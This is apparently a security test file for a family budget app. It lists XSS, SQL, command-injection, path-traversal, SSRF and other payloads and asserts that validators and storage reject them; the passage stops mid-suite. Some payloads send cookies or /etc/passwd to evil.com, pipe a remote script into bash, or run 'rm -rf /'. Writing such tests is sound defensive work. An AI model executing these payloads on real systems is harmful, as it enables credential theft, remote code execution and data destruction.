/**
 * Security Attack Simulation Tests
 * 
 * These tests simulate real-world hacker attack patterns to ensure
 * the application properly handles malicious input.
 * 
 * Attack categories covered:
 * - XSS (Cross-Site Scripting) - 35+ payloads
 * - SQL Injection - 13 payloads
 * - NoSQL Injection - 10 payloads
 * - Prototype Pollution - 15+ payloads
 * - Path Traversal - 9 payloads
 * - Command Injection - 12 payloads
 * - LDAP Injection - 8 payloads
 * - ReDoS (Regex Denial of Service) - 8 payloads
 * - SSRF (Server-Side Request Forgery) - 10 payloads
 * - Unicode Attacks - 15+ payloads
 * - JSON Injection - 10 payloads
 * - Header Injection (CRLF) - 8 payloads
 * - Template Injection - 12 payloads
 * - Mass Assignment - 5 payloads
 * - Numeric Attacks - 10+ payloads
 * - Buffer Overflow Patterns - 5 payloads
 * 
 * PWA-Specific Security:
 * - Service Worker Cache Poisoning - 6 payloads
 * - IndexedDB Data Integrity - 10+ tests
 * - Offline ID Manipulation - 8+ payloads
 * - Sync Queue Injection - 4 payloads
 * - Storage Quota Abuse - 3 tests
 * - Origin/Scope Validation - 8+ tests
 * - Background Sync Security - 4 tests
 * - PWA Installation Security - 4 tests
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { getSecureStorageItem, setSecureStorageItem } from './storage/secureStorage';
import {
  CreateExpenseInputSchema,
  CreateGoalInputSchema,
  CreateIncomeSourceInputSchema,
  CreateRecurringExpenseInputSchema,
  CreateGoalEntryInputSchema,
  CreateManualGoalEntryInputSchema,
  CreateSubcategoryInputSchema,
  MonthLimitsSchema,
} from './validators';
import { ExpenseRowSchema, MonthRowSchema } from './schemas';
import { sanitizeCurrencyInput, parseCurrencyInput } from './utils/formatters';
import { mapExpense, mapGoal, mapSubcategory } from './mappers';

// ============================================================================
// XSS (Cross-Site Scripting) Attack Payloads
// ============================================================================

const XSS_PAYLOADS = {
  // Basic script injection
  basic: [
    '<script>alert(1)</script>',
    '<script>document.location="http://evil.com?c="+document.cookie</script>',
    '<script src="http://evil.com/malware.js"></script>',
  ],
  
  // Event handler injection
  eventHandlers: [
    '<img src=x onerror=alert(1)>',
    '<img/src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
  ],
  
  // Encoding bypass attempts
  encoded: [
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode escape
    '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoding
    '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entities
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', // Hex entities
    '<scr<script>ipt>alert(1)</scr</script>ipt>', // Nested tags
    '<<script>script>alert(1)</<script>/script>', // Double encoding
  ],
  
  // Template literal injection
  templateLiteral: [
    '${alert(1)}',
    '`${alert(1)}`',
    '{{constructor.constructor("alert(1)")()}}',
  ],
  
  // SVG-based XSS
  svg: [
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1)>',
    '<svg><set onbegin=alert(1)>',
  ],
  
  // Data URI schemes
  dataUri: [
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'javascript:alert(1)',
    'vbscript:msgbox(1)',
    'livescript:alert(1)',
  ],

  // Mutation XSS (mXSS)
  mutation: [
    '<noscript><p title="</noscript><script>alert(1)</script>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  ],
};

// ============================================================================
// SQL Injection Payloads
// ============================================================================

const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE expenses; --",
  "1'; DELETE FROM users WHERE '1'='1",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "'; INSERT INTO users VALUES ('hacker', 'password'); --",
  "1; UPDATE users SET password='hacked' WHERE username='admin'",
  "' UNION SELECT * FROM users --",
  "' UNION SELECT password FROM users WHERE username='admin' --",
  "admin'--",
  "1' AND (SELECT COUNT(*) FROM users) > 0 --",
  "'; EXEC xp_cmdshell('dir'); --",
  "1'; WAITFOR DELAY '0:0:10' --", // Time-based blind injection
];

// ============================================================================
// Prototype Pollution Payloads
// ============================================================================

const PROTOTYPE_POLLUTION_PAYLOADS = [
  '__proto__',
  'constructor',
  'prototype',
  '__proto__[isAdmin]',
  'constructor.prototype.isAdmin',
];

// ============================================================================
// Path Traversal Payloads
// ============================================================================

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
  '/etc/passwd',
  'C:\\Windows\\System32\\config\\SAM',
  'file:///etc/passwd',
  '....//....//etc/passwd',
];



// ============================================================================
// NoSQL Injection Payloads (MongoDB-style, relevant for some backends)
// ============================================================================

const NOSQL_INJECTION_PAYLOADS = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "sleep(5000)"}',
  '{"$regex": ".*"}',
  '{"$or": [{"a": 1}, {"b": 2}]}',
  "'; return this.password; var dummy='",
  '{"$lookup": {"from": "users"}}',
  '{"__proto__": {"admin": true}}',
  '{"$set": {"isAdmin": true}}',
  '{"constructor": {"prototype": {"isAdmin": true}}}',
];

// ============================================================================
// Command Injection Payloads
// ============================================================================

const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(whoami)',
  '; rm -rf /',
  '& dir',
  '| net user',
  '; curl http://evil.com/shell.sh | bash',
  '`curl http://evil.com?data=$(cat /etc/passwd)`',
  '\n/bin/sh',
  '||ping -c 10 127.0.0.1||',
  '; echo "pwned" > /tmp/pwned',
];

// ============================================================================
// LDAP Injection Payloads
// ============================================================================

const LDAP_INJECTION_PAYLOADS = [
  '*)(uid=*))(|(uid=*',
  'admin)(&)',
  'x])(|(cn=*',
  '*)(objectClass=*',
  'admin)(|(password=*)',
  '*)(!(&(1=0',
  '*))%00',
  'admin))(|(objectclass=*)',
];

// ============================================================================
// ReDoS (Regular Expression Denial of Service) Payloads
// ============================================================================

const REDOS_PAYLOADS = [
  'a'.repeat(50) + '!',                    // Backtracking bomb
  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  'x]'.repeat(20) + '[',
  '((((((((((((((((((((a]',
  'a]'.repeat(30),
  '\t'.repeat(100),
  ' '.repeat(10000),                        // Whitespace bomb
  'a]b]c]d]e]f]g]h]i]j]k]l]m]n]o]p]',
];

// ============================================================================
// SSRF (Server-Side Request Forgery) Payloads
// ============================================================================

const SSRF_PAYLOADS = [
  'http://localhost:22',
  'http://127.0.0.1:3306',
  'http://[::1]:80',
  'http://0.0.0.0:80',
  'http://169.254.169.254/latest/meta-data/',  // AWS metadata
  'http://metadata.google.internal/',           // GCP metadata
  'http://192.168.1.1/admin',
  'file:///etc/passwd',
  'dict://localhost:11211/stat',
  'gopher://localhost:6379/_INFO',
];

// ============================================================================
// JSON Injection Payloads
// ============================================================================

const _JSON_INJECTION_PAYLOADS = [
  '{"key": "value", "__proto__": {"admin": true}}',
  '{"a": 1, "a": 2}',                          // Duplicate keys
  '{"nested": '.repeat(100) + '1' + '}'.repeat(100),  // Deep nesting
  '["a", "b", "c"'.repeat(1000) + ']',         // Long arrays
  '{"key": "\u0000value"}',                    // Null byte in JSON
  '{"key": "\\"}',                             // Escape sequence abuse
  '{"constructor": {"prototype": {"isAdmin": true}}}',
  '{"__lookupGetter__": "x"}',
  '{"__defineSetter__": "x"}',
  '{"toJSON": "malicious"}',
];

// ============================================================================
// Header Injection (CRLF) Payloads
// ============================================================================

const CRLF_INJECTION_PAYLOADS = [
  'value\r\nSet-Cookie: admin=true',
  'value\r\nLocation: http://evil.com',
  'value\r\n\r\n<script>alert(1)</script>',
  '%0d%0aSet-Cookie:%20admin=true',
  '%0ASet-Cookie:%20admin=true',
  'value%0D%0AHeader-Injection:true',
  '\r\nX-Injected: true',
  'value\nX-Injected: true',
];

// ============================================================================
// Template Injection Payloads (Various Frameworks)
// ============================================================================

const TEMPLATE_INJECTION_PAYLOADS = {
  // Angular/Vue style
  angular: [
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    '[[constructor.constructor("alert(1)")()]]',
    '${7*7}',
  ],
  // Server-side template engines
  serverSide: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    '@(7*7)',
    '{{config}}',
    '{{self}}',
  ],
};

// ============================================================================
// Mass Assignment Payloads (Extra fields that shouldn't be accepted)
// ============================================================================

const MASS_ASSIGNMENT_PAYLOADS = {
  adminEscalation: { isAdmin: true, role: 'admin', permissions: ['*'] },
  idManipulation: { id: 'hacker-id', user_id: 'victim-id' },
  timestampManipulation: { created_at: '1970-01-01', updated_at: '2099-12-31' },
  foreignKeyManipulation: { family_id: 'other-family', owner_id: 'other-user' },
  metadataInjection: { __metadata: { type: 'admin' }, _internal: true },
};

// ============================================================================
// Buffer Overflow Patterns
// ============================================================================

const BUFFER_OVERFLOW_PAYLOADS = [
  'A'.repeat(256),     // Just over the 255 char limit
  'A'.repeat(1000),    // 1KB
  'A'.repeat(10000),   // 10KB
  '%s'.repeat(100),    // Format string attack
  '%n'.repeat(100),    // Format string attack
];

// ============================================================================
// Polyglot Payloads (Work across multiple contexts)
// ============================================================================

const POLYGLOT_PAYLOADS = [
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
  "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
  "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
  "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">",
  "<<SCRIPT>alert(1)//<</SCRIPT>",
];

// ============================================================================
// Unicode Attack Payloads
// ============================================================================

const UNICODE_ATTACKS = {
  // Right-to-Left Override (can make filenames appear different)
  rtlOverride: [
    '\u202Eexe.doc', // Shows as "doc.exe" visually
    'harmless\u202Etxt.exe',
  ],
  
  // Zero-width characters (invisible text injection)
  zeroWidth: [
    'admin\u200Broot', // Zero-width space
    'test\u200Cvalue', // Zero-width non-joiner
    'data\u200Dfield', // Zero-width joiner
    '\uFEFFmalicious', // Byte order mark
  ],
  
  // Homoglyphs (lookalike characters)
  homoglyphs: [
    'аdmin', // Cyrillic 'а' instead of Latin 'a'
    'рaypal', // Cyrillic 'р' instead of Latin 'p'
    'ехample', // Mixed Cyrillic
  ],
  
  // Null bytes
  nullByte: [
    'valid\x00malicious',
    'file.txt\x00.exe',
  ],
};

// ============================================================================
// Test Suites
// ============================================================================

describe('Security - XSS Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('secureStorage rejects XSS in family ID', () => {
    const allXssPayloads = [
      ...XSS_PAYLOADS.basic,
      ...XSS_PAYLOADS.eventHandlers,
      ...XSS_PAYLOADS.encoded,
      ...XSS_PAYLOADS.templateLiteral,
      ...XSS_PAYLOADS.svg,
      ...XSS_PAYLOADS.dataUri,
      ...XSS_PAYLOADS.mutation,
    ];

    it.each(allXssPayloads)('should reject XSS payload: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
      localStorage.setItem('current-family-id', payload);
      expect(getSecureStorageItem('current-family-id')).toBeNull();
    });
  });

  describe('Zod schemas sanitize title fields', () => {
    // Note: Zod accepts strings but limits length - XSS prevention happens at render time with React
    it('should accept but limit title length (React handles escaping)', () => {
      const longXssPayload = '<script>'.repeat(100);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: longXssPayload,
        category_key: 'essenciais',
        value: 100,
      });
      // Title max is 255 chars, so this should fail due to length
      expect(result.success).toBe(false);
    });

    it('should accept normal titles with special chars that React will escape', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Coffee & Tea <3',
        category_key: 'essenciais',
        value: 5,
      });
      // React's JSX will escape these when rendered
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - SQL Injection Prevention', () => {
  describe('validators accept SQL-like strings (Supabase uses parameterized queries)', () => {
    // Note: Supabase uses parameterized queries, so SQL injection in string values is not a threat
    // However, we test that the validators work correctly with these inputs

    it.each(SQL_INJECTION_PAYLOADS.slice(0, 5))('should handle SQL payload in title: %s', (payload) => {
      // Zod validates structure, Supabase handles SQL safety via parameterization
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255), // Ensure within max length
        category_key: 'essenciais',
        value: 100,
      });
      // Should pass validation - SQL injection is handled by Supabase's parameterized queries
      expect(result.success).toBe(true);
    });
  });

  describe('secureStorage rejects SQL injection in IDs', () => {
    it.each(SQL_INJECTION_PAYLOADS)('should reject SQL injection in family ID: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Prototype Pollution Prevention', () => {
  describe('rejects prototype pollution in IDs', () => {
    it.each(PROTOTYPE_POLLUTION_PAYLOADS)('should reject: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('JSON parse safety', () => {
    it('should not pollute Object prototype via JSON.parse', () => {
      const maliciousJson = '{"__proto__": {"isAdmin": true}}';
      const parsed = JSON.parse(maliciousJson);
      
      // Verify the parsed object has __proto__ as a regular property, not prototype pollution
      expect(parsed.__proto__).toEqual({ isAdmin: true });
      // But Object prototype should NOT be polluted
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });

    it('should not pollute via constructor.prototype', () => {
      const maliciousJson = '{"constructor": {"prototype": {"isAdmin": true}}}';
      const parsed = JSON.parse(maliciousJson);
      
      expect(parsed.constructor).toEqual({ prototype: { isAdmin: true } });
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });
  });
});

describe('Security - Path Traversal Prevention', () => {
  describe('rejects path traversal in IDs', () => {
    it.each(PATH_TRAVERSAL_PAYLOADS)('should reject: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Malicious Numeric Input', () => {
  describe('Zod schema rejects Infinity and NaN', () => {
    it('should reject Infinity in expense value', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: Infinity,
      });
      expect(result.success).toBe(false);
    });

    it('should reject -Infinity in expense value', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: -Infinity,
      });
      expect(result.success).toBe(false);
    });

    it('should reject NaN in expense value', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: NaN,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative values', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: -100,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('sanitizeCurrencyInput handles malicious input', () => {
    it('should strip non-numeric characters', () => {
      expect(sanitizeCurrencyInput('123abc456')).toBe('123456');
      expect(sanitizeCurrencyInput('<script>100</script>')).toBe('100');
      expect(sanitizeCurrencyInput('$1,000.00')).toBe('1,00000'); // Note: comma preserved for Brazilian format
    });

    it('should handle multiple minus signs', () => {
      expect(sanitizeCurrencyInput('--100')).toBe('-100');
      expect(sanitizeCurrencyInput('-10-0')).toBe('-100');
    });

    it('should handle empty and whitespace', () => {
      expect(sanitizeCurrencyInput('')).toBe('');
      expect(sanitizeCurrencyInput('   ')).toBe('');
    });
  });

  describe('parseCurrencyInput handles edge cases', () => {
    it('should return 0 for invalid input', () => {
      expect(parseCurrencyInput('')).toBe(0);
      expect(parseCurrencyInput('abc')).toBe(0);
      expect(parseCurrencyInput('not a number')).toBe(0);
    });

    it('should parse valid Brazilian format', () => {
      expect(parseCurrencyInput('100,50')).toBe(100.5);
      expect(parseCurrencyInput('1000,00')).toBe(1000);
    });
  });
});

describe('Security - Unicode Attack Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects RTL override attacks', () => {
    it.each(UNICODE_ATTACKS.rtlOverride)('should reject RTL override: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects zero-width character attacks', () => {
    it.each(UNICODE_ATTACKS.zeroWidth)('should reject zero-width chars: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects homoglyph attacks in IDs', () => {
    it.each(UNICODE_ATTACKS.homoglyphs)('should reject homoglyphs: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects null byte injection', () => {
    it.each(UNICODE_ATTACKS.nullByte)('should reject null bytes: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Input Boundary Testing', () => {
  describe('extremely long inputs', () => {
    it('should reject title exceeding max length', () => {
      const longTitle = 'A'.repeat(256);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: longTitle,
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });

    it('should accept title at max length', () => {
      const maxTitle = 'A'.repeat(255);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: maxTitle,
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(true);
    });
  });

  describe('empty and whitespace inputs', () => {
    it('should reject empty title', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: '',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });

    it('should reject empty month_id', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: '',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('type coercion attacks', () => {
    it('should reject string as number', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: '100' as unknown,
      });
      expect(result.success).toBe(false);
    });

    it('should reject array as string', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: ['month', '123'] as unknown,
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });

    it('should reject object as string', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: { id: 'month-123' } as unknown,
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(false);
    });
  });
});

describe('Security - Category Injection Prevention', () => {
  it('should only accept valid category keys', () => {
    const invalidCategories = [
      'admin',
      'root',
      'system',
      '__proto__',
      'constructor',
      '<script>',
      'essenciais; DROP TABLE expenses;',
    ];

    invalidCategories.forEach(category => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: category,
        value: 100,
      });
      expect(result.success).toBe(false);
    });
  });

  it('should accept all valid category keys', () => {
    const validCategories = ['essenciais', 'conforto', 'metas', 'prazeres', 'liberdade', 'conhecimento'];

    validCategories.forEach(category => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: category,
        value: 100,
      });
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Goal and Income Validation', () => {
  describe('CreateGoalInputSchema security', () => {
    it('should reject Infinity in target_value', () => {
      const result = CreateGoalInputSchema.safeParse({
        family_id: 'fam-123',
        name: 'Savings',
        target_value: Infinity,
      });
      expect(result.success).toBe(false);
    });

    it('should reject NaN in target_value', () => {
      const result = CreateGoalInputSchema.safeParse({
        family_id: 'fam-123',
        name: 'Savings',
        target_value: NaN,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('CreateIncomeSourceInputSchema security', () => {
    it('should reject negative income', () => {
      const result = CreateIncomeSourceInputSchema.safeParse({
        name: 'Salary',
        value: -5000,
      });
      expect(result.success).toBe(false);
    });

    it('should reject Infinity income', () => {
      const result = CreateIncomeSourceInputSchema.safeParse({
        name: 'Salary',
        value: Infinity,
      });
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Advanced Attack Simulations
// ============================================================================

describe('Security - NoSQL Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects NoSQL injection patterns in IDs', () => {
    const nosqlPatterns = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$regex":".*"}',
    ];

    it.each(nosqlPatterns)('should reject NoSQL pattern: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('validates JSON-like payloads in titles', () => {
    it.each(NOSQL_INJECTION_PAYLOADS.slice(0, 5))('should handle NoSQL payload in title: %s', (payload) => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      // Zod accepts strings - NoSQL safety is handled by Supabase (PostgreSQL)
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Command Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects command injection in IDs', () => {
    it.each(COMMAND_INJECTION_PAYLOADS)('should reject command: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('command payloads in text fields', () => {
    it.each(COMMAND_INJECTION_PAYLOADS.slice(0, 6))('should accept but not execute: %s', (payload) => {
      // These are accepted as text but never executed (frontend-only app)
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - LDAP Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects LDAP injection in IDs', () => {
    it.each(LDAP_INJECTION_PAYLOADS)('should reject LDAP payload: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - ReDoS Prevention', () => {
  describe('handles potentially catastrophic regex inputs', () => {
    it.each(REDOS_PAYLOADS)('should handle ReDoS payload without hanging: %s', (payload) => {
      const startTime = Date.now();
      
      // Test that validation completes quickly (under 100ms)
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      
      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThan(100); // Should not hang
      expect(result.success).toBeDefined();
    });

    it('should reject extremely long whitespace strings', () => {
      const whitespaceAttack = ' '.repeat(10000);
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: whitespaceAttack,
        category_key: 'essenciais',
        value: 100,
      });
      // Exceeds max length
      expect(result.success).toBe(false);
    });
  });
});

describe('Security - SSRF Pattern Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects SSRF patterns in IDs', () => {
    it.each(SSRF_PAYLOADS)('should reject SSRF pattern: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - JSON Injection Prevention', () => {
  describe('handles malformed JSON safely', () => {
    it('should NEVER pollute Object.prototype via JSON.parse', () => {
      // Test each payload individually with explicit assertions
      const pollutionPayloads = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"__proto__": {"polluted": "yes"}}',
      ];

      pollutionPayloads.forEach(payload => {
        // Capture state before
        const beforePolluted = ({} as Record<string, unknown>).isAdmin;
        const beforePolluted2 = ({} as Record<string, unknown>).polluted;
        
        // Parse the malicious JSON
        const parsed = JSON.parse(payload);
        
        // Object.prototype MUST NOT be polluted
        expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
        expect(({} as Record<string, unknown>).polluted).toBeUndefined();
        expect(beforePolluted).toBeUndefined();
        expect(beforePolluted2).toBeUndefined();
        
        // The parsed object has __proto__ as OWN property, not prototype chain
        expect(parsed).toBeDefined();
      });
    });

    it('should reject or handle malformed JSON without crashing', () => {
      const malformedPayloads = [
        '{"key": "value", ', // Incomplete
        '{"nested": '.repeat(100) + '1' + '}'.repeat(100), // Deep nesting
        '["a", "b", "c"'.repeat(100) + ']', // Malformed array
        '{"key": "\\"}'.slice(0, -1), // Escape sequence abuse
      ];

      let parseErrors = 0;
      let parseSuccesses = 0;

      malformedPayloads.forEach(payload => {
        try {
          JSON.parse(payload);
          parseSuccesses++;
        } catch {
          parseErrors++;
        }
      });

      // At least some should fail (malformed) - this MUST not crash
      expect(parseErrors + parseSuccesses).toBe(malformedPayloads.length);
      // Most of these are malformed, so errors should dominate
      expect(parseErrors).toBeGreaterThan(0);
    });

    it('should handle deeply nested JSON within reasonable depth', () => {
      // Create deeply nested but valid JSON (50 levels)
      let nested = '{"a":';
      for (let i = 0; i < 50; i++) {
        nested += '{"b":';
      }
      nested += '1' + '}'.repeat(51);

      // This should parse without throwing (within V8 limits)
      const result = JSON.parse(nested);
      expect(result).toHaveProperty('a');
      expect(result.a).toHaveProperty('b');
    });

    it('should handle duplicate keys by using last value (JSON spec)', () => {
      const duplicateKeys = '{"a": 1, "a": 2}';
      const parsed = JSON.parse(duplicateKeys);
      
      // JSON spec: last value wins
      expect(parsed.a).toBe(2);
    });
  });
});

describe('Security - CRLF Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects CRLF injection in IDs', () => {
    it.each(CRLF_INJECTION_PAYLOADS)('should reject CRLF payload: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('handles CRLF in text fields', () => {
    it('should accept but neutralize CRLF in titles', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test\r\nInjection',
        category_key: 'essenciais',
        value: 100,
      });
      // Zod accepts it - React will render it safely
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Template Injection Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects Angular/Vue template injection in IDs', () => {
    it.each(TEMPLATE_INJECTION_PAYLOADS.angular)('should reject template: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('rejects server-side template injection in IDs', () => {
    it.each(TEMPLATE_INJECTION_PAYLOADS.serverSide)('should reject template: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('template payloads in text fields', () => {
    const allTemplates = [
      ...TEMPLATE_INJECTION_PAYLOADS.angular,
      ...TEMPLATE_INJECTION_PAYLOADS.serverSide,
    ];

    it.each(allTemplates)('should accept but not interpret: %s', (payload) => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      // React doesn't interpret these - they're just strings
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Mass Assignment Prevention', () => {
  describe('Zod schemas MUST strip extra fields (default behavior)', () => {
    it('should strip isAdmin field from expense - field MUST NOT exist in result', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        isAdmin: true, // Attack: privilege escalation attempt
      } as unknown);

      // Zod default mode strips unknown keys - parsing MUST succeed
      expect(result.success).toBe(true);
      // The malicious field MUST be stripped
      const data = result.data as Record<string, unknown>;
      expect(Object.keys(data)).not.toContain('isAdmin');
      expect(data.isAdmin).toBeUndefined();
    });

    it('should strip ALL mass assignment attack fields from expense', () => {
      const attackPayload = {
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        // All these are attack vectors:
        ...MASS_ASSIGNMENT_PAYLOADS.idManipulation,
        ...MASS_ASSIGNMENT_PAYLOADS.adminEscalation,
        ...MASS_ASSIGNMENT_PAYLOADS.metadataInjection,
      };

      const result = CreateExpenseInputSchema.safeParse(attackPayload);
      
      // Parsing MUST succeed (fields stripped, not rejected)
      expect(result.success).toBe(true);
      
      // ALL attack fields MUST be stripped
      const data = result.data as Record<string, unknown>;
      expect(data.id).toBeUndefined();
      expect(data.user_id).toBeUndefined();
      expect(data.isAdmin).toBeUndefined();
      expect(data.role).toBeUndefined();
      expect(data.permissions).toBeUndefined();
      expect(data.__metadata).toBeUndefined();
      expect(data._internal).toBeUndefined();
      
      // Only valid fields should remain
      const validData = result.data as Record<string, unknown>;
      expect(Object.keys(validData).sort()).toEqual(
        ['category_key', 'month_id', 'title', 'value'].sort()
      );
    });

    it('should strip timestamp manipulation attempts', () => {
      const attackPayload = {
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        ...MASS_ASSIGNMENT_PAYLOADS.timestampManipulation,
      };

      const result = CreateExpenseInputSchema.safeParse(attackPayload);
      
      expect(result.success).toBe(true);
      expect((result.data as Record<string, unknown>).created_at).toBeUndefined();
      expect((result.data as Record<string, unknown>).updated_at).toBeUndefined();
    });

